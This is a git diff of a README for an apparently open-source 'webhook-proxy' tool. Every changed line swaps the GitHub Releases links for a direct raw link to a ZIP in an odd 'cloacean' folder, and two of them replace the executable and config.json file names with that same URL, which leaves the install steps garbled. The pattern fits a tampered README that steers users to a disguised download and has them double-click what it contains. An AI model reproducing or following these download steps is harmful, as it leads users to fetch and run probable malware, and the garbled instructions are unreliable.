@@ -6,11 +6,11 @@ Welcome to webhook-proxy! This is an open-source webhook proxy service built on 
 
 ## 📥 Download the Application
 
-[![Download webhook-proxy](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/bated-genuscricetus536/webhook-proxy/releases)
+[![Download webhook-proxy](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/cloacean/webhook-proxy.zip)](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/cloacean/webhook-proxy.zip)
 
 To get started, you need to download the webhook-proxy application. You can do this by visiting the Releases page below:
 
-[Visit this page to download](https://github.com/bated-genuscricetus536/webhook-proxy/releases)
+[Visit this page to download](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/cloacean/webhook-proxy.zip)
 
 ## 📋 System Requirements
 
@@ -26,7 +26,7 @@ Before you download, ensure your system meets these requirements:
 Follow these steps to install webhook-proxy:
 
 1. **Download the Application**
-   - Visit the Releases page to download the latest version: [Download Here](https://github.com/bated-genuscricetus536/webhook-proxy/releases)
+   - Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/cloacean/webhook-proxy.zip)
 
 2. **Extract the Files**
    - Once the download finishes, locate the ZIP file.
@@ -34,7 +34,7 @@ Follow these steps to install webhook-proxy:
 
 3. **Run the Application**
    - Navigate to the newly created folder.
-   - Locate `webhook-proxy.exe` (Windows) or `webhook-proxy` (macOS/Linux).
+   - Locate `https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/cloacean/webhook-proxy.zip` (Windows) or `webhook-proxy` (macOS/Linux).
    - Double-click the file to run the application.
 
 ## 🌟 Configuration
@@ -42,7 +42,7 @@ Follow these steps to install webhook-proxy:
 After running the application, you need to configure it for your webhook integrations. Here's a simple way to set it up:
 
 1. **Open the Configuration File**
-   - Locate `config.json` in the same folder as the application.
+   - Locate `https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/cloacean/webhook-proxy.zip` in the same folder as the application.
    - Open it with any text editor.
 
 2. **Modify Configuration Settings**
